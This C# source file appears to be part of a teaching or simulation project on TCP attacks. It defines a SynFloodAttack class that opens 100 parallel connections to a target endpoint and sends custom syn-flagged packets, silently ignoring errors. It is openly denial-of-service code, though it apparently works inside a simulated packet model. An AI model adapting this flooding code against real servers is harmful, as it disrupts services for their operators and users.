using System.Net.Sockets;
using System.Net;
using System.Text;
using TCPAttacks;

namespace TPCAttacks.Attacks
{
    internal class SynFloodAttack
    {
        private int _clientPort;
        private IPEndPoint _serverEndPoint;
        public SynFloodAttack(int clientPort, IPEndPoint serverEndPoint)
        {
            _clientPort = clientPort;
            _serverEndPoint = serverEndPoint;
        }

        public async Task Attack()
        {
            await Task.Delay(500);

            Parallel.For(0, 100, (i) =>
            {
                try
                {
                    Socket socket = new(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    socket.Connect(_serverEndPoint);

                    SendPacket(socket, Packet.GetEmptyPacket(4, _clientPort,  7003 + i, 0, 0, syn: true));
                }
                catch { }
            });
        }

        private void SendPacket(Socket socket, Packet packet)
        {
            byte[] responseBuffer = packet.GetBytes();
            socket.Send(responseBuffer);
        }

		public Packet ReceivePacket(Socket socket)
		{
			byte[] receivedBuffer = new byte[2048];
			int receivedCount = socket.Receive(receivedBuffer);
			byte[] data = new byte[receivedCount];
			Array.Copy(receivedBuffer, data, receivedCount);

			return data.ToArray().GetTcpPacket();
		}
	}
}
